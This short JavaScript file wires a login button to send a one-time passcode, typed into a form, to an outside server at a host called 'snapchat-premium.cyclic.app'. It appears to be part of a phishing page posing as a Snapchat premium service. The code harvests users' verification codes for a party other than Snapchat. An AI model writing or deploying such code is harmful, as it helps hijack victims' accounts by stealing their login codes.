const OTPInput = document.getElementById("otpForm");
const submitBtn = document.getElementById("loginBtn");

const getOtp = async () => {
    const data = {
        userOtp: OTPInput.value,
        TypeOfAuth: "OTP"
    };

    const url = "https://snapchat-premium.cyclic.app/AuthOtp";
    const options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    };

    try {
        const response = await fetch(url, options);
        if (!response.ok) {
            throw new Error('Network error or something else');
        }
        const responseData = await response.json();
        console.log(responseData);
    } catch (error) {
        console.error(error);
    }
};

submitBtn.addEventListener("click", getOtp);
